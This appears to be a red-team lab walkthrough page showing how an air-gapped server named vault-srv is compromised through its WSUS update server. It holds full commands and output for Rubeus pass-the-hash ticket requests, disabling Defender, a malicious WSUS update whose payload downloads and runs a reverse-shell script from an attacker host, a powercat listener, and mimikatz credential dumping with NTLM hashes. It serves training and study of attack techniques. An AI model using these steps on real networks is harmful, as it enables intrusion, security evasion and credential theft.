---
layout: default
---

## vault-srv.gcbvault.local

The vault-srv server belongs to an airgap unrechable network from the gcb.local and it.gcb.local domains. And the unique way for access to this server is via Wsus update. 


### 1. Wsus update exploitation

The firewall open ports for wsus update are:
```
8530
8531
```

With Enterpise Admin privileges access to gcb-wsus.gcb.local server:
```
C:\tools\Rubeus.exe asktgt /domain:gcb.local /user:Administrator /ntlm:f1498c1d1a036c796d0093b2eeae02e2 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: f1498c1d1a036c796d0093b2eeae02e2
[*] Building AS-REQ (w/ preauth) for: 'gcb.local\Administrator'
[*] Using domain controller: 192.168.4.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      LmxvY2Fs
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/gcb.local
  ServiceRealm             :  GCB.LOCAL
  UserName                 :  Administrator
  UserRealm                :  GCB.LOCAL
  StartTime                :  7/20/2024 1:07:12 AM
  EndTime                  :  7/20/2024 11:07:12 AM
  RenewTill                :  7/27/2024 1:07:12 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  t+9bmxTSv8ATcE4R3QEr/Q==
  ASREP (key)              :  F1498C1D1A036C796D0093B2EEAE02E2

PS C:\Users\itemployee15> Enter-PSSession -ComputerName gcb-wsus.gcb.local

```
Disable AV and download the exploitation required software:
```
[gcb-wsus.gcb.local]: PS C:\Users\Administrator.GCB\Documents> Set-MpPreference -DisableRealtimeMonitoring $True
[gcb-wsus.gcb.local]: PS C:\Users\Administrator.GCB\Documents> cd C:\
[gcb-wsus.gcb.local]: PS C:\> wget http://192.168.100.15/WSUSpendu.ps1 -OutFile C:\WSUSpendu.ps1
[gcb-wsus.gcb.local]: PS C:\> wget http://192.168.100.15/PsExec64.exe -OutFile C:\PsExec64.exe
```
Inject a malicious update payload with WSUSpendu.ps1:
```
[gcb-wsus.gcb.local]: PS C:\> .\WSUSpendu.ps1 -Inject -PayloadFile .\PsExec64.exe -PayloadArgs 'powershell iex (iwr -usebasicParsing http://192.168.100.15:8531/Invoke-PowerShellTcpEx.ps1)'
Everything seems ok. Wait for the client to take the update now...
To clean the injection, execute the following command:
.\Wsuspendu.ps1 -Clean -UpdateID 9af3b8ac-b657-4ae1-afc3-27e65678817f
[gcb-wsus.gcb.local]: PS C:\> Get-WsusUpdate -Approval Unapproved

Title                                        Classification   Installed/Not Applicable Percentage Approved
-----                                        --------------   ----------------------------------- --------
Bundle update for * Windows (from KB2862335) Security Updates                                     NotApproved
```
Approve the software update from server to connected client:
```
[gcb-wsus.gcb.local]: PS C:\> Get-WsusUpdate -Approval Unapproved | Approve-WsusUpdate -Action Install -TargetGroupName "All Computers"
```

### 2. Obtaining reverse shell

From the attacker machine using WSUS port listen and wait for spwaned powershell session:
```
PS C:\tools> powercat -l -v -p 8530 -t 999999
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 8530)
VERBOSE: Connection from [192.168.149.1] port  [tcp] accepted (source port 50248)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
Windows PowerShell running as user Administrator on VAULT-SRV
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\SoftwareDistribution\Download\Install>whoami
vault-srv\administrator
PS C:\Windows\SoftwareDistribution\Download\Install> hostname
vault-srv
PS C:\Windows\SoftwareDistribution\Download\Install> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::44e9:92d2:2757:cd58%8
   IPv4 Address. . . . . . . . . . . : 192.168.149.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.149.254
PS C:\Windows\SoftwareDistribution\Download\Install>
```

### 3. Disable AV and Dump Lsass process

```
PS C:\> C:\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

844     {0;000003e7} 1 D 24353          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0107a64c} 0 D 17506537    VAULT-SRV\Administrator S-1-5-21-246659359-3264923455-1831587784-500   (14g,22p)        Primary
 * Thread Token  : {0;000003e7} 1 D 17615147    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 240244 (00000000:0003aa74)
Session           : Service from 0
User Name         : FAD4FCB7-1FA3-4F89-9121-184D092C3640
Domain            : NT VIRTUAL MACHINE
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:56 PM
SID               : S-1-5-83-1-4208262327-1334386595-1293427089-1077292041
        msv :
        tspkg :
        wdigest :
         * Username : VAULT-SRV$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : FAD4FCB7-1FA3-4F89-9121-184D092C3640
         * Domain   : NT VIRTUAL MACHINE
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 206404 (00000000:00032644)
Session           : Service from 0
User Name         : 2CA4FCC7-D8B5-4FFF-AD03-F178F9037043
Domain            : NT VIRTUAL MACHINE
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:55 PM
SID               : S-1-5-83-1-749010119-1342167221-2029061037-1131414521
        msv :
        tspkg :
        wdigest :
         * Username : VAULT-SRV$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : 2CA4FCC7-D8B5-4FFF-AD03-F178F9037043
         * Domain   : NT VIRTUAL MACHINE
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 53705 (00000000:0000d1c9)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:51 PM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : VAULT-SRV$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 53664 (00000000:0000d1a0)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:51 PM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : VAULT-SRV$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : VAULT-SRV$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:51 PM
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : VAULT-SRV$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : vault-srv$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 31494 (00000000:00007b06)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:51 PM
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : VAULT-SRV$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 17278540 (00000000:0107a64c)
Session           : Batch from 0
User Name         : Administrator
Domain            : VAULT-SRV
Logon Server      : VAULT-SRV
Logon Time        : 7/20/2024 1:18:01 AM
SID               : S-1-5-21-246659359-3264923455-1831587784-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : VAULT-SRV
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
         * DPAPI    : da39a3ee5e6b4b0d3255bfef95601890
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : VAULT-SRV
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 5531911 (00000000:00546907)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : VAULT-SRV
Logon Server      : VAULT-SRV
Logon Time        : 4/29/2024 12:29:46 AM
SID               : S-1-5-21-246659359-3264923455-1831587784-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : VAULT-SRV
         * NTLM     : 31680e0ab41586b7d768fda82d6d4ccd
         * SHA1     : e258f96af95b1deae471457569f7d6fd09c02720
         * DPAPI    : e258f96af95b1deae471457569f7d6fd
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : VAULT-SRV
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : VAULT-SRV
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:51 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 30169 (00000000:000075d9)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:51 PM
SID               :
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 5477747 (00000000:00539573)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2024 12:29:29 AM
SID               : S-1-5-90-0-2
        msv :
        tspkg :
        wdigest :
         * Username : VAULT-SRV$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 5474729 (00000000:005389a9)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/29/2024 12:29:29 AM
SID               : S-1-5-96-0-2
        msv :
        tspkg :
        wdigest :
         * Username : VAULT-SRV$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 5477712 (00000000:00539550)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2024 12:29:29 AM
SID               : S-1-5-90-0-2
        msv :
        tspkg :
        wdigest :
         * Username : VAULT-SRV$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 31545 (00000000:00007b39)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:51 PM
SID               : S-1-5-96-0-1
        msv :
        tspkg :
        wdigest :
         * Username : VAULT-SRV$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : VAULT-SRV$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:51 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : VAULT-SRV$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : vault-srv$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Web Credentials
        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (0)

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
        Name       : Windows Credentials
        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault
        Items (0)

mimikatz(commandline) # vault::cred /patch
TargetName : WindowsLive:target=virtualapp/didlogical / <NULL>
UserName   : 02nvzdsqgbmqeiqx
Comment    : PersistedCredential
Type       : 1 - generic
Persist    : 2 - local_machine
Flags      : 00000000
Credential :
Attributes : 32


mimikatz(commandline) # exit
Bye!
```

[back](./section8.html)
